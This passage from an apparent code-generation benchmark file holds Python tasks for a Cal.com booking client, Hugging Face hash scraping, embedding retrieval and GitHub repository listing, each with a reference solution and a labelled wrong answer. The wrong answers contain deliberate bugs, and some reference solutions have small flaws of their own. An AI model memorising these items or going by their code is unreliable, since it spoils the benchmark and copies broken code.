    "Canonical_solution": "import requests\nimport pytz\nfrom typing import Dict, Optional\nfrom datetime import datetime\n\nclass CalComAPI:\n    def __init__(self, api_key: str, event_type_id: int, user_timezone: str = \"America/New_York\"):\n        self.api_key = api_key\n        self.event_type_id = event_type_id\n        self.user_timezone = user_timezone\n\n    def _convert_to_user_timezone(self, utc_time: str) -> str:\n        utc_dt = datetime.fromisoformat(utc_time.replace(\"Z\", \"+00:00\"))\n        user_tz = pytz.timezone(self.user_timezone)\n        user_dt = utc_dt.astimezone(user_tz)\n        return user_dt.strftime(\"%Y-%m-%d %H:%M %Z\")\n\n    def _get_headers(self, api_version: str = \"2024-08-13\") -> Dict[str, str]:\n        return {\n            \"Authorization\": f\"Bearer {self.api_key}\",\n            \"cal-api-version\": api_version,\n            \"Content-Type\": \"application/json\",\n        }\n\n    def get_available_slots(self, start_date: str, end_date: str) -> str:\n        try:\n            url = \"https://api.cal.com/v2/slots/available\"\n            querystring = {\n                \"startTime\": f\"{start_date}T00:00:00Z\",\n                \"endTime\": f\"{end_date}T23:59:59Z\",\n                \"eventTypeId\": self.event_type_id,\n            }\n\n            response = requests.get(url, headers=self._get_headers(), params=querystring)\n            if response.status_code == 200:\n                slots = response.json()[\"data\"][\"slots\"]\n                available_slots = []\n                for date, times in slots.items():\n                    for slot in times:\n                        user_time = self._convert_to_user_timezone(slot[\"time\"])\n                        available_slots.append(user_time)\n                return f\"Available slots: {', '.join(available_slots)}\"\n            return f\"Failed to fetch slots: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def create_booking(self, start_time: str, name: str, email: str) -> str:\n        try:\n            url = \"https://api.cal.com/v2/bookings\"\n            start_time = datetime.fromisoformat(start_time).astimezone(pytz.utc).isoformat(timespec=\"seconds\")\n            payload = {\n                \"start\": start_time,\n                \"eventTypeId\": self.event_type_id,\n                \"attendee\": {\"name\": name, \"email\": email, \"timeZone\": self.user_timezone},\n            }\n\n            response = requests.post(url, json=payload, headers=self._get_headers())\n            if response.status_code == 201:\n                booking_data = response.json()[\"data\"]\n                user_time = self._convert_to_user_timezone(booking_data[\"start\"])\n                return f\"Booking created successfully for {user_time}. Booking uid: {booking_data['uid']}\"\n            return f\"Failed to create booking: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def get_upcoming_bookings(self, email: str) -> str:\n        try:\n            url = \"https://api.cal.com/v2/bookings\"\n            querystring = {\"status\": \"upcoming\", \"attendeeEmail\": email}\n\n            response = requests.get(url, headers=self._get_headers(), params=querystring)\n            if response.status_code == 200:\n                bookings = response.json()[\"data\"]\n                if not bookings:\n                    return \"No upcoming bookings found.\"\n\n                booking_info = []\n                for booking in bookings:\n                    user_time = self._convert_to_user_timezone(booking[\"start\"])\n                    booking_info.append(\n                        f\"uid: {booking['uid']}, Title: {booking['title']}, Time: {user_time}, Status: {booking['status']}\"\n                    )\n                return \"Upcoming bookings:\\n\" + \"\\n\".join(booking_info)\n            return f\"Failed to fetch bookings: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def reschedule_booking(self, booking_uid: str, new_start_time: str, reason: str) -> str:\n        try:\n            url = f\"https://api.cal.com/v2/bookings/{booking_uid}/reschedule\"\n            new_start_time = datetime.fromisoformat(new_start_time).astimezone(pytz.utc).isoformat(timespec=\"seconds\")\n            payload = {\"start\": new_start_time, \"reschedulingReason\": reason}\n\n            response = requests.post(url, json=payload, headers=self._get_headers())\n            if response.status_code == 201:\n                booking_data = response.json()[\"data\"]\n                user_time = self._convert_to_user_timezone(booking_data[\"start\"])\n                return f\"Booking rescheduled to {user_time}. New booking uid: {booking_data['uid']}\"\n            return f\"Failed to reschedule booking: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"\n\n    def cancel_booking(self, booking_uid: str, reason: str) -> str:\n        try:\n            url = f\"https://api.cal.com/v2/bookings/{booking_uid}/cancel\"\n            payload = {\"cancellationReason\": reason}\n\n            response = requests.post(url, json=payload, headers=self._get_headers())\n            if response.status_code == 200:\n                return \"Booking cancelled successfully.\"\n            return f\"Failed to cancel booking: {response.text}\"\n        except Exception as e:\n            return f\"Error: {str(e)}\"",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom datetime import datetime\nfrom typing import Dict\n\nclass CalComAPI:\n    def __init__(self, api_key: str, event_type_id: int, user_timezone: str = \"America/New_York\"):\n        self.api_key = api_key\n        self.event_type_id = event_type_id\n        self.user_timezone = user_timezone\n        self.base_url = \"https://api.cal.com\"\n\n    def _convert_to_user_timezone(self, utc_time: str) -> str:\n        utc_dt = datetime.fromisoformat(utc_time.replace(\"Z\", \"+00:00\"))\n        user_tz = pytz.timezone(self.user_timezone)\n        user_dt = utc_dt.astimezone(user_tz)\n        return user_dt.isoformat()\n\n    def _get_headers(self, api_version: str = \"2024-08-13\") -> Dict[str, str]:\n        return {\n            \"Authorization\": f\"Bearer {self.api_key}\",\n            \"X-API-Version\": api_version,\n            \"Content-Type\": \"application/json\"\n        }\n\n    def get_available_slots(self, start_date: str, end_date: str) -> str:\n        url = f\"{self.base_url}/availability\"\n        params = {\n            \"eventTypeId\": self.event_type_id,\n            \"start\": start_date,\n            \"end\": end_date\n        }\n        response = requests.get(url, headers=self._get_headers(), params=params)\n        return response.json()\n\n    def create_booking(self, start_time: str, name: str, email: str) -> str:\n        url = f\"{self.base_url}/bookings\"\n        payload = {\n            \"eventTypeId\": self.event_type_id,\n            \"startTime\": start_time,\n            \"name\": name,\n            \"email\": email\n        }\n        response = requests.post(url, headers=self._get_headers(), json=payload)\n        return response.json()\n\n    def get_upcoming_bookings(self, email: str) -> str:\n        url = f\"{self.base_url}/bookings/upcoming\"\n        params = {\"email\": email}\n        response = requests.get(url, headers=self._get_headers(), params=params)\n        return response.json()\n\n    def reschedule_booking(self, booking_uid: str, new_start_time: str, reason: str) -> str:\n        url = f\"{self.base_url}/bookings/{booking_uid}\"\n        payload = {\n            \"newStartTime\": new_start_time,\n            \"reason\": reason\n        }\n        response = requests.patch(url, headers=self._get_headers(), json=payload)\n        return response.json()\n\n    def cancel_booking(self, booking_uid: str, reason: str) -> str:\n        url = f\"{self.base_url}/bookings/{booking_uid}\"\n        payload = {\n            \"reason\": reason\n        }\n        response = requests.delete(url, headers=self._get_headers(), json=payload)\n        return response.json()\n```"
  },
  {
    "Task_id": 96,
    "Instruction": "Task Description: Scrape SHA256 hashes from Hugging Face dataset pages and save them to a file.\n\nFunction Description: This function scrapes SHA256 hashes from a series of Hugging Face dataset pages by making HTTP GET requests to each page, parsing the HTML content to extract the hashes, and writing them to an output file along with their corresponding filenames. It also prints the collected hashes to the console.\n\nInput: None (The function uses hardcoded URLs and output filename)\n\nOutput: \n1. Writes to \"shard_hashes.txt\" file with format: \"[filename] [SHA256 hash]\"\n2. Prints collected SHA256 hashes to console with format: \"SHA256 hash [index]: [hash]\"\n3. Prints error messages for failed requests or missing hashes",
    "Canonical_solution": "import requests\nimport re\n\ndef scrape_huggingface_hashes():\n    base_url = 'https://huggingface.co/datasets/EleutherAI/pythia_deduped_pile_idxmaps/blob/main/pile_0.87_deduped_text_document-'\n    sha256_list = []\n\n    with open(\"shard_hashes.txt\", \"w\") as output_file:\n        for i in range(83):\n            page_number = f\"{i:05d}-of-00082.bin\"\n            url = base_url + page_number\n            file_name = url.split('/')[-1]\n\n            response = requests.get(url)\n\n            if response.status_code == 200:\n                html_content = response.text\n                matches = re.findall(r'<strong>SHA256:</strong>\\s*([\\da-fA-F]+)', html_content)\n\n                if matches:\n                    sha256_list.extend(matches)\n                    for sha256 in matches:\n                        output_file.write(f\"{file_name} {sha256}\\n\")\n                else:\n                    print(f\"No hash found for file: {file_name}\")\n            else:\n                print(f\"Failed to fetch HTML content from {url}. Status code: {response.status_code}\")\n\n    for idx, sha256 in enumerate(sha256_list, start=1):\n        print(f\"SHA256 hash {idx}: {sha256}\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom bs4 import BeautifulSoup\n\ndef scrape_hugging_face_hashes():\n    urls = [\n        \"https://huggingface.co/datasets/dataset_name/shard-00000-of-00001\",\n        \"https://huggingface.co/datasets/dataset_name/shard-00001-of-00001\"\n        # Add more URLs as needed\n    ]\n    output_file = \"shard_hashes.txt\"\n    \n    with open(output_file, \"w\") as f:\n        for i, url in enumerate(urls):\n            try:\n                response = requests.get(url)\n                response.raise_for_status()\n                soup = BeautifulSoup(response.text, \"html.parser\")\n                \n                # Assuming the SHA256 hash is within a <span> tag with class \"sha256-hash\"\n                sha256_tag = soup.find(\"span\", class_=\"sha256-hash\")\n                if sha256_tag:\n                    sha256_hash = sha256_tag.text.strip()\n                    filename = f\"shard-{i:05d}-of-00001\"\n                    f.write(f\"{filename} {sha256_hash}\\n\")\n                    print(f\"SHA256 hash {i}: {sha256_hash}\")\n                else:\n                    print(f\"Error: SHA256 hash not found on page {url}\")\n            except requests.RequestException as e:\n                print(f\"Error fetching {url}: {e}\")\n\nscrape_hugging_face_hashes()\n```"
  },
  {
    "Task_id": 97,
    "Instruction": "Task Description: Create a function that retrieves word embeddings from either a local API or OpenAI's API, depending on the specified model.\n\nFunction Description: The function `get_embedding_from_api` fetches a word embedding (vector representation) for a given word using either a local HTTP API or OpenAI's API. It handles both types of API calls, processes the response, and returns the embedding as a NumPy array. If the request fails, it prints an error message and returns None.\n\nInput:  \n- `word` (str): The word or text to generate an embedding for.  \n- `model` (str, optional): The name of the model to use for generating embeddings. Defaults to \"vicuna-7b-v1.5\".  \n\nOutput:  \n- `numpy.ndarray` or `None`: Returns the word embedding as a NumPy array if successful; otherwise, returns None.  \n\nNote: The function assumes the local API endpoint is running at `http://localhost:8000/v1/embeddings` and expects a JSON payload with `model` and `input` fields. For OpenAI's API, it assumes the `openai` library is properly configured.",
    "Canonical_solution": "import json\nimport requests\nimport numpy as np\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.5\"):\n    if \"ada\" in model:\n        resp = openai.Embedding.create(\n            model=model,\n            input=word,\n        )\n        embedding = np.array(resp[\"data\"][0][\"embedding\"])\n        return embedding\n\n    url = \"http://localhost:8000/v1/embeddings\"\n    headers = {\"Content-Type\": \"application/json\"}\n    data = json.dumps({\"model\": model, \"input\": word})\n\n    response = requests.post(url, headers=headers, data=data)\n    if response.status_code == 200:\n        embedding = np.array(response.json()[\"data\"][0][\"embedding\"])\n        return embedding\n    else:\n        print(f\"Error: {response.status_code} - {response.text}\")\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport numpy as np\nimport openai\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.5\"):\n    try:\n        if model == \"vicuna-7b-v1.5\":\n            response = requests.post(\"http://localhost:8000/v1/embeddings\", json={\"model\": model, \"input\": word})\n            response.raise_for_status()\n            data = response.json()\n            embedding = np.array(data[\"data\"][0][\"embedding\"])\n        else:\n            embedding_response = openai.Embedding.create(input=word, model=model)\n            embedding_data = embedding_response['data'][0]['embedding']\n            embedding = np.array(embedding_data)\n        \n        return embedding\n    except requests.exceptions.RequestException as e:\n        print(f\"Error fetching embedding from local API: {e}\")\n        return None\n    except Exception as e:\n        print(f\"Error fetching embedding from OpenAI API: {e}\")\n        return None\n```"
  },
  {
    "Task_id": 98,
    "Instruction": "Task Description: Create a function to fetch all repositories from a GitHub organization using the GitHub API.\n\nFunction Description: The function `fetch_github_repos` asynchronously retrieves all repositories belonging to a specified GitHub organization. It handles pagination to ensure all repositories are fetched, even if they span multiple pages. The function uses the GitHub REST API with proper authentication and headers.\n\nInput:\n- `org_name` (str): The name of the GitHub organization whose repositories are to be fetched.\n- `token` (str): A GitHub personal access token for authentication.\n\nOutput:\n- Returns a list of dictionaries, where each dictionary represents a repository from the organization. Returns an empty list if the request fails or no repositories are found.",
    "Canonical_solution": "import requests\ntoken = \"YOUR_GITHUB_TOKEN\"\n\nasync def fetch_github_repos(org_name, token):\n    url = f\"https://api.github.com/orgs/{org_name}/repos\"\n    headers = {\n        \"Accept\": \"application/vnd.github+json\",\n        \"Authorization\": f\"Bearer {token}\",\n        \"X-GitHub-Api-Version\": \"2022-11-28\",\n    }\n\n    params = {\n        \"per_page\": 100  # You can adjust this number (max is 100)\n    }\n\n    all_repos = []\n\n    while url:\n        response = requests.get(url, headers=headers, params=params)\n\n        if response.status_code == 200:\n            repos = response.json()\n            all_repos.extend(repos)\n\n            # Check if there is a 'next' page\n            if \"next\" in response.links:\n                url = response.links[\"next\"][\"url\"]\n            else:\n                url = None\n        else:\n            print(\n                f\"Failed to fetch repositories: {response.status_code} - {response.text}\"\n            )\n            break\n\n    return all_repos",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport asyncio\nimport aiohttp\n\nasync def fetch_github_repos(org_name, token):\n    base_url = f\"https://api.github.com/orgs/{org_name}/repos\"\n    headers = {\n        \"Authorization\": f\"token {token}\",\n        \"Accept\": \"application/vnd.github.v3+json\"\n    }\n    all_repos = []\n    \n    async with aiohttp.ClientSession() as session:\n        page = 1\n        while True:\n            params = {\"page\": page}\n            async with session.get(base_url, headers=headers, params=params) as response:\n                if response.status == 200:\n                    repos = await response.json()\n                    if not repos:\n                        break\n                    all_repos.extend(repos)\n                    page += 1\n                else:\n                    print(f\"Failed to fetch repositories: {response.status}\")\n                    break\n    \n    return all_repos\n\n# Example usage:\n# asyncio.run(fetch_github_repos('your_org_name', 'your_github_token'))\n```"
  }
]